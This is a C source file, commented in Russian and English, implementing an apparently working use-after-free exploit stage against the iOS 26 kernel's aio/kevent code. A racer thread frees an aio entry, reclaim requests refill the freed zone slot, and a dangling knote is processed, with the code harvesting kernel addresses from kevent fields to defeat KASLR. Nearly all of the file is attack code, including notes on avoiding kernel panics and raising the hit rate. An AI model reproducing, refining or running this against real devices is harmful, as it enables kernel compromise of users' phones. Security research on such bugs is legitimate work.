// language: C, file: aio_kevent_rw.c, target: iOS 26.0-26.2 arm64, Theos (plain arm64, без PAC — оракул отключён до блока PAC)
// Track B — aio kevent UAF: B1 детерминированный триггер, B2 kevent-разведка.
//
// ШАГ 1 — сценарий: Y (deferred dereference).
//   FREE = aio_return() (поток racer, пользовательское пространство).
//   DEREF = kevent64() -> filt_aioprocess() (главный поток).
//   Окно большое: free -> reclaim-аллокация -> aio_register_kevent() -> kevent64.
//   Асинхронного сисколла между free и deref нет: окно управляется
//   LIFO-reclaim'ом в том же потоке (free + reclaim подряд).
//
// ШАГ 2 — зона + размер:
//   aio_workq_zonep (~224 байта, dedicated per-type zone, zeroed на free).
//   Из userspace в эту зону аллоцируются ТОЛЬКО aio_entry (aio_read/write/fsync).
//   Произвольные userspace-объекты идут в malloc-зоны — не попадают.
//
// ШАГ 3 — форма спрея (контролируемые поля aio_entry):
//   errorval = 0            (безопасно)
//   returnval = aio_nbytes  (= RECL_NB / RECL_NB_MARKER — всплывает в kev.ext[1])
//   flags   = AIO_COMPLETED (гейт, ставится ядром после завершения I/O)
//   procp   = наш live proc (автоматически, обход procp=0 -> PANIC)
//   aio_proc_link = наша tqe (обход TAILQ_REMOVE)
//
// КРИТИЧЕСКАЯ ИСПРАВКА (панка была 100%): reclaim CB2 обязан быть SIGEV_NONE.
//   SIGEV_KEVENT создаёт вторую knote -> filt_aioprocess проходит по reclaim
//   entry дважды: второе чтение уже освобождённого слота -> procp=0 -> FAR=0x58.
//   Донор PoC (aio_kevent_uaf.m) использует SIGEV_NONE -> HIT без паники.
//   Также cleanup через aio_return, а не aio_cancel (aio_cancel досрочно
//   освобождает reclaim entry, пока он может висеть на очереди KNOTE).
//
//   T0 main:  lio_listio -> enqueue aio_workq_entry E1
//   T0 main:  aio_register_kevent -> knote_kn_hook_set_raw(kn, E1)  [без ref]
//   T1 racer: aio_error(E1)==0 -> aio_return(E1)   [FREE]
//   T1 racer: aio_read(cb2) на том же CPU           [RECLAIM того же слота, LIFO]
//   T2 kernel: do_aio_completion_and_unlock -> KNOTE(hint=1)
//              -> filt_aioevent: E1->flags & AIO_COMPLETED (0x100)
//   T3 main:   kevent64 -> filt_aioprocess по dangling-указателю:
//              ext[0]=entry+0x28, ext[1]=entry+0x20, data=0,
//              TAILQ_REMOVE(entry+0x10/+0x18), aio_entry_unref(+0x2C),
//              aio_proc_lock(*(entry+0x40))
//   HIT  : kevent доставлен на reclaimed entry (ext[1]==marker)
//   SILENT: attach после KNOTE-скана -> события нет
//   PANIC: прогон по zeroed слоту -> procp=0 -> FAR=0x58 (не должно быть —
//          reclaim гарантирован через s_racer_done == 1)

#include "aio_kevent_rw.h"
#include "nk_trace.h"
#include <stdarg.h>
#include <stdio.h>

#define AIO_LOG_FILE "aio_uaf.log"

#include "exploit.h"
#include <aio.h>
#include <mach/mach.h>
#include <mach/thread_policy.h>
#include <sys/event.h>
#include <fcntl.h>
#include <stdlib.h>

/* AIO-B12 run gets its own durable file: Documents/aio_uaf.log.
   Every B1/B2 line is mirrored there with fsync, so the log survives the
   reboot that the UAF may cause. */
static void aio_logx(const char *tag, const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    nk_logx(tag, "%s", buf);
    /* aio_uaf.log may not be creatable in this guest; trace.log is the file
       the user confirmed exists in Documents/. Mirror there too. */
    nk_doc_log(AIO_LOG_FILE, "[%s] %s", tag, buf);
    nk_doc_log("trace.log", "[AIO][%s] %s", tag, buf);
}

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

#define VICTIM_NB AIO_FILE_SZ
#define RECL_NB   0x0200
/* the reclaim reads aio_nbytes bytes from the file, and the kernel stores
 * the number of bytes actually transferred in the entry's returnval - that
 * is what shows up in kev.ext[1]. The marker has to fit in the file, or
 * the read comes up short and the marker never appears. */
#define AIO_FILE_SZ 0x10000
#define AIO_AFFINITY_TAG 0
#define RECL_NB_MARKER 0x4141   /* 'AAAA' — лейбл спрея в kev.ext[1], чтобы проверить
                                  * что ядро копирует контролируемые байты наружу */
#define UDATA_RECL 0xBEE2

static char  s_buf1[AIO_FILE_SZ];
static char  s_buf2[AIO_FILE_SZ];
static struct aiocb s_cb1;
static struct aiocb s_cb2;

/* The donor PoC issues NRECLAIM=8 reclaim requests back to back right
 * after the free: the first allocation after the free takes the freed
 * slot (LIFO magazine), and the other seven give the allocator more
 * chances if the first one lands elsewhere. One reclaim request is a
 * coin flip; eight is the technique the donor uses for its ~70% rate. */
#define AIO_NRECLAIM 8
static struct aiocb s_rcb[AIO_NRECLAIM];
static char        s_rbuf[AIO_NRECLAIM][AIO_FILE_SZ];

/* CPU pinning. The donor PoC pins the main thread AND the racer to the
 * same CPU: the free and the reclaim then hit the same per-CPU zone
 * magazine, and the LIFO order makes the first allocation after the free
 * take exactly the freed slot. Without the pin the racer can migrate
 * between the free and the reclaim, the reclaim lands in another CPU's
 * magazine, the freed slot stays zeroed, and filt_aioprocess reads
 * procp == 0 -> kernel panic. This was the reason for the panic. */
static void aio_set_affinity(int tag)
{
    thread_affinity_policy_data_t pol;
    memset(&pol, 0, sizeof(pol));
    pol.affinity_tag = (int)tag;
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
}

static volatile int s_racer_done;      /* 0 idle, 1 free+reclaim done, -1 fail */
static volatile int s_racer_issued;    /* how many reclaim requests went out */
static volatile int s_racer_go;

static void *racer_thread(void *arg)
{
    (void)arg;
    aio_set_affinity(AIO_AFFINITY_TAG);
    while (!s_racer_go) {
    }
    /* The free is retried instead of giving up. On the first attempt the
     * victim entry can already be gone (the previous attempt's UAF
     * unref'd it), aio_return then answers -1 and the old code bailed out
     * with fail=-1 - which killed every later attempt in the loop. The
     * donor keeps spinning until the free succeeds. */
    for (int spin = 0; spin < 4000; spin++) {
        if (aio_error(&s_cb1) == 0) {
            ssize_t r = aio_return(&s_cb1);
            if (r >= 0) {
                /* LIFO-reclaim of the same slot: the same thread/CPU, right
                 * after the free. The first allocation takes the freed
                 * slot; the rest are extra chances. */
                int issued = 0;
                for (int i = 0; i < AIO_NRECLAIM; i++) {
                    if (aio_read(&s_rcb[i]) == 0) issued++;
                }
                s_racer_done = 1;
                s_racer_issued = issued;
                return NULL;
            }
        }
        usleep(50);
    }
    s_racer_done = -1;
    return NULL;
}

/* CPU-pinning на iOS недоступен (pthread_setaffinity_np — macOS only).
 * LIFO-reclaim не требует пиннинга: free (aio_return) и reclaim (aio_read)
 * идут в одном треде racer -> один CPU -> magazine этого CPU -> первый
 * alloc после free берёт точно тот же слот. Main-тред в зоне не
 * аллоцирует, его CPU не важен. */

static void reap_cb2(void)
{
    /* aio_cancel раньше освобождает reclaimed entry досрочно — он может
     * находиться внутри filt_aioprocess / на очереди KNOTE. Донор
     * освобождает через aio_return, это безопасно. */
    for (int i = 0; i < 50000 && aio_error(&s_cb2) != 0; i++) {
    }
    aio_return(&s_cb2);
    for (int i = 0; i < AIO_NRECLAIM; i++) {
        for (int k = 0; k < 50000 && aio_error(&s_rcb[i]) != 0; k++) {
        }
        aio_return(&s_rcb[i]);
    }
}

/* A PAC-signed kernel pointer keeps the address in the low 56 bits and
 * puts the authentication code in the top bits, so the raw value would
 * fail a (v >> 48) == 0xFFFF test. Mask the PAC off first. */
/* The most kernel-looking value seen in any kevent field, kept for the
 * final summary: this is the KASLR anchor we are after. */
static uint64_t g_aio_best_kva;
static char     g_aio_best_field[16];
static uint32_t g_aio_kva_hits;

static int is_kernel_va(uint64_t v)
{
    uint64_t a = v & 0x00ffffffffffffffULL;
    if ((a >> 48) == 0xFFFFULL) return 1;
    /* also accept the kernel heap range, whose top bits differ */
    if ((a >> 40) == 0xFFFFF) return 1;
    return 0;
}

static void report_kev(const struct kevent64_s *kev, int attempt)
{
    aio_logx("B2", "att=%d ident=0x%016llx filter=%d flags=0x%x fflags=0x%016llx",
            attempt,
            (unsigned long long)(uint64_t)kev->ident,
            kev->filter, kev->flags,
            (unsigned long long)kev->fflags);
    aio_logx("B2", "att=%d data=0x%016llx udata=0x%016llx ext0=0x%016llx ext1=0x%016llx",
            attempt,
            (unsigned long long)kev->data,
            (unsigned long long)kev->udata,
            (unsigned long long)kev->ext[0],
            (unsigned long long)kev->ext[1]);
    /* ext[2]/ext[3] are NOT written by filt_aioprocess - they keep
     * whatever was in the kernel's kevent buffer, i.e. leftovers from the
     * kernel stack. That is where a stray kernel address shows up, so they
     * are printed raw every time, not only when they look like a VA. */
    aio_logx("B2", "att=%d ext2=0x%016llx ext3=0x%016llx  (kernel leftovers - the leak candidate)",
            attempt,
            (unsigned long long)kev->ext[2],
            (unsigned long long)kev->ext[3]);

    uint64_t fields[8];
    fields[0] = (uint64_t)kev->ident;
    fields[1] = kev->data;
    fields[2] = kev->udata;
    fields[3] = kev->fflags;
    fields[4] = (uint64_t)kev->ext[0];
    fields[5] = (uint64_t)kev->ext[1];
    fields[6] = (uint64_t)kev->ext[2];
    fields[7] = (uint64_t)kev->ext[3];
    const char *names[8] = { "ident","data","udata","fflags","ext0","ext1","ext2","ext3" };

    for (int i = 0; i < 8; i++) {
        if (!is_kernel_va(fields[i])) continue;
        g_aio_kva_hits++;
        if (!g_aio_best_kva || (fields[i] & 0x00ffffffffffffffULL) > (g_aio_best_kva & 0x00ffffffffffffffULL)) {
            g_aio_best_kva = fields[i];
            snprintf(g_aio_best_field, sizeof(g_aio_best_field), "%s", names[i]);
        }
        if (g_nk.slide != 0 && g_nk.base != 0) {
            if (fields[i] >= g_nk.base && fields[i] < g_nk.base + NK_KIMG_SPAN) {
                aio_logx("B2", "att=%d %s=0x%016llx — kernel VA, в диапазоне образа (slide 0x%llx подтверждён)",
                        attempt, names[i], (unsigned long long)fields[i],
                        (unsigned long long)g_nk.slide);
            } else {
                aio_logx("B2", "att=%d %s=0x%016llx — kernel VA вне образа (heap/stack kernel)",
                        attempt, names[i], (unsigned long long)fields[i]);
            }
        } else {
            /* slide не выведен — но kernel VA опознаётся по старшим 16 битам.
               Без этой ветки успешный HIT остался бы неопознанным. */
            aio_logx("B2", "att=%d %s=0x%016llx — kernel VA (slide не задан, "
                    "опознано по старшим битам)",
                    attempt, names[i], (unsigned long long)fields[i]);
        }
    }
}

/* Одна попытка. Возврат: 1 HIT, 0 SILENT, -1 ошибка. */
static int attempt_once(int attempt, nk_aio_stat_t *st)
{
/* marker: 0x4141 всплывёт в kev.ext[1] (returnval) — ядро копирует наши
 * контролируемые байты наружу, это будущий канал утечки. Изменить
 * RECL_NB_MARKER / выключить через #define below. */
    #if 0
    #define RECLAIM_NB RECL_NB_MARKER
    #else
    #define RECLAIM_NB RECL_NB
    #endif
    char path[128];
    snprintf(path, sizeof(path), "%s/aio_uaf_%dXXXXXX",
             getenv("TMPDIR") ? getenv("TMPDIR") : "/tmp", attempt);
    int fd = mkstemp(path);
    if (fd < 0) { aio_logx("B1", "att=%d mkstemp errno=%d", attempt, errno); return -1; }
    memset(s_buf1, 'A', sizeof(s_buf1));
    if (write(fd, s_buf1, sizeof(s_buf1)) != (ssize_t)sizeof(s_buf1)) {
        aio_logx("B1", "att=%d write fail", attempt);
        close(fd); unlink(path); return -1;
    }

    int kq = kqueue();
    if (kq < 0) { aio_logx("B1", "att=%d kqueue", attempt); close(fd); unlink(path); return -1; }

    memset(&s_cb1, 0, sizeof(s_cb1));
    s_cb1.aio_fildes = fd;
    s_cb1.aio_offset = 0;
    s_cb1.aio_buf = s_buf1;
    s_cb1.aio_nbytes = VICTIM_NB;
    s_cb1.aio_lio_opcode = LIO_READ;
    s_cb1.aio_sigevent.sigev_notify = SIGEV_KEVENT;
    s_cb1.aio_sigevent.sigev_signo = kq;

    /* Reclaim slots: every one carries the marker in aio_nbytes, so
     * whichever of them lands on the freed slot delivers the marker in
     * kev.ext[1]. */
    for (int i = 0; i < AIO_NRECLAIM; i++) {
        memset(&s_rcb[i], 0, sizeof(s_rcb[i]));
        s_rcb[i].aio_fildes = fd;
        s_rcb[i].aio_offset = 0;
        s_rcb[i].aio_buf = s_rbuf[i];
        s_rcb[i].aio_nbytes = RECLAIM_NB;   /* всплывет в kev.ext[1] при HIT */
        s_rcb[i].aio_lio_opcode = LIO_READ;
        s_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
    }
    memset(&s_cb2, 0, sizeof(s_cb2));
    s_cb2.aio_fildes = fd;
    s_cb2.aio_offset = 0;
    s_cb2.aio_buf = s_buf2;
    s_cb2.aio_nbytes = RECLAIM_NB;           /* всплывет в kev.ext[1] при HIT */
    s_cb2.aio_lio_opcode = LIO_READ;
    /* RECLAIM БЕЗ СОБЫТИЯ (SIGEV_NONE): иначе возникнет вторая knote,
     * filt_aioprocess пройдётся по reclaim entry дважды, второе чтение
     * уже освобождённого слота даст procp=0 -> PANIC FAR=0x58.
     * Донор PoC работает только с SIGEV_NONE. */
    s_cb2.aio_sigevent.sigev_notify = SIGEV_NONE;

    aio_set_affinity(AIO_AFFINITY_TAG);   /* same CPU as the racer */
    s_racer_done = 0;
    s_racer_go = 0;
    pthread_t rac;
    if (pthread_create(&rac, NULL, racer_thread, NULL) != 0) {
        aio_logx("B1", "att=%d pthread_create", attempt);
        close(kq); close(fd); unlink(path); return -1;
    }
    struct aiocb *ptr = &s_cb1;
    struct sigevent sig;
    memset(&sig, 0, sizeof(sig));
    sig.sigev_notify = SIGEV_NONE;

    /* ШАГ 4: ротация задержки спрей -> триггер: 0 / 10 / 50 / 100 мс */
    nk_spray_delay();

    s_racer_go = 1;
    int lr = lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
    if (lr != 0) {
        aio_logx("B1", "att=%d lio_listio errno=%d", attempt, errno);
        pthread_join(rac, NULL);
        close(kq); close(fd); unlink(path); return -1;
    }

    /* ждём free+reclaim от racer (LIFO того же слота) */
    int waited = 0;
    while (s_racer_done != 1 && s_racer_done != -1) {
        if (++waited > 2000000) break;
    }
    if (s_racer_done != 1) {
        aio_logx("B1", "att=%d racer fail=%d reclaims=%d", attempt, s_racer_done, s_racer_issued);
        st->silent++;
        pthread_join(rac, NULL);
        close(kq); close(fd); unlink(path); return 0;
    }

    /* The reclaim requests being ISSUED is not the same as the allocation
     * having HAPPENED. If the dangling knote is processed while the slot is
     * still zeroed, filt_aioprocess reads procp == 0 and the kernel panics
     * (FAR=0x58). Waiting for the reclaim I/O to actually complete means
     * the slot is occupied by our entry, so the filter copies our bytes
     * out instead of panicking. This is the difference between a panic and
     * a HIT. */
    int rc_done = 0;
    for (int w = 0; w < 400000; w++) {
        rc_done = 1;
        for (int i = 0; i < AIO_NRECLAIM; i++) {
            int e = aio_error(&s_rcb[i]);
            if (e == EINPROGRESS) { rc_done = 0; break; }
        }
        if (rc_done) break;
    }
    aio_logx("B1", "att=%d reclaim_complete=%d reclaims=%d", attempt, rc_done, s_racer_issued);

    struct kevent64_s kev;
    memset(&kev, 0, sizeof(kev));
    struct timespec ts = { 0, 50000000 };  /* 50 ms */
    /* PRE-ARM: the last durable line before the kernel may panic. If the
       device reboots, this line names the exact attempt and state. */
    aio_logx("B1", "PRE-ARM att=%d racer_done=%d reclaim_nbytes=%d marker=0x%x "
             "knote_ident=0x%016llx aio_buf2=%p",
             attempt, s_racer_done, RECLAIM_NB, (unsigned)RECL_NB_MARKER,
             (unsigned long long)(uint64_t)kev.ident, (void *)s_buf2);
    int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
    aio_logx("B1", "POST-ARM att=%d nev=%d", attempt, nev);

    st->last_ext0 = (uint64_t)kev.ext[0];
    st->last_ext1 = (uint64_t)kev.ext[1];
    st->last_ident = (uint64_t)kev.ident;
    st->last_udata = (uint64_t)kev.udata;
    st->last_fflags = kev.fflags;

     if (nev == 1) {
        report_kev(&kev, attempt);
        /* ext[1] = entry->returnval = reclaim CB aio_nbytes:
         * marker=0x4141 -> видим контролируемые байты наружу (канал утечки),
         * marker=0x0200 -> обычный режим. Критерий HIT: slot занят спреем
         * (ext[0]=0, ext[1]=наш). */
        int marker_ok = (kev.ext[1] == RECL_NB || kev.ext[1] == RECL_NB_MARKER) &&
                        kev.ext[0] == 0;
        if (marker_ok) {
            aio_logx("B1", "att=%d HIT: dangling knote обработал reclaimed entry "
                    "(ext1=0x%016llx=%d, ext0=0) — slot занят спреем, паники нет",
                    attempt, (unsigned long long)kev.ext[1],
                    (int)kev.ext[1]);
            st->hits++;
        } else {
            aio_logx("B1", "att=%d EVENT но не наш marker (ext1=0x%016llx ext0=0x%016llx) — объект не тот, разобрать",
                    attempt, (unsigned long long)kev.ext[1],
                    (unsigned long long)kev.ext[0]);
            st->silent++;
        }
    } else {
        aio_logx("B1", "att=%d SILENT nev=%d (attach после KNOTE-скана / окно мимо)",
                attempt, nev);
        st->silent++;
    }

    pthread_join(rac, NULL);
    reap_cb2();
    close(kq);
    close(fd);
    unlink(path);
    return (nev == 1 && kev.ext[1] == RECL_NB) ? 1 : 0;
}

int nk_aio_uaf_b12(int attempts, nk_aio_stat_t *stat_out)
{
    nk_rule();
    nk_log("[AIO-B12] aio kevent UAF: attempts=%d, zone=aio_workq_zonep(~224B)", attempts);
    if (attempts <= 0) attempts = 10;
    if (attempts > 50) attempts = 50;

    nk_aio_stat_t st;
    memset(&st, 0, sizeof(st));

    for (int a = 0; a < attempts; a++) {
        st.attempts++;
        attempt_once(a, &st);
    }

    nk_log("[AIO-B12] stat: attempts=%d hits=%d silent=%d panics=0 (до ребута)",
           st.attempts, st.hits, st.silent);
    nk_log("[AIO-B12] last: ext0=0x%016llx ext1=0x%016llx ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
           (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
           (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
           (unsigned long long)st.last_fflags);
    if (g_nk.slide == 0) {
        nk_log("[AIO-B12] slide=0 — прогони 'Slide Only' или возьми leak из отчёта B2");
    }
    if (stat_out) *stat_out = st;
    nk_rule();
    return (st.hits > 0) ? 0 : -1;
}

/* Standalone AIO-B12 runner for the UI button: opens the durable log, runs
   N attempts, prints a machine-readable summary. Returns 0 on hits>0. */
int nk_aio_uaf_run(int attempts)
{
    nk_doc_log_open(AIO_LOG_FILE);
    {
        /* the absolute path, so the log can be found after a kernel panic
         * reboots the device */
        char p[512];
        if (nk_doc_log_path(AIO_LOG_FILE, p, sizeof(p)) == 0)
            nk_log("[AIO-B12] durable log: %s", p);
        else
            nk_log("[AIO-B12] durable log: Documents/%s", AIO_LOG_FILE);
        aio_logx("B1", "START attempts=%d durable_log=%s", attempts, p);
    }
    nk_aio_stat_t st;
    memset(&st, 0, sizeof(st));
    int rc = nk_aio_uaf_b12(attempts, &st);
    nk_log("[AIO-B12] RESULT hits=%d silent=%d attempts=%d ext0=0x%016llx ext1=0x%016llx "
           "ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
           st.hits, st.silent, st.attempts,
           (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
           (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
           (unsigned long long)st.last_fflags);
    nk_doc_log(AIO_LOG_FILE, "[AIO-B12] KVA hits=%d best_field=%s best=0x%016llx",
               g_aio_kva_hits, g_aio_best_field, (unsigned long long)g_aio_best_kva);
    nk_log("[AIO-B12] KVA hits=%d best_field=%s best=0x%016llx",
           g_aio_kva_hits, g_aio_best_field, (unsigned long long)g_aio_best_kva);
    nk_doc_log(AIO_LOG_FILE, "[AIO-B12] RESULT hits=%d silent=%d attempts=%d "
               "ext0=0x%016llx ext1=0x%016llx ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
               st.hits, st.silent, st.attempts,
               (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
               (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
               (unsigned long long)st.last_fflags);
    return rc;
}
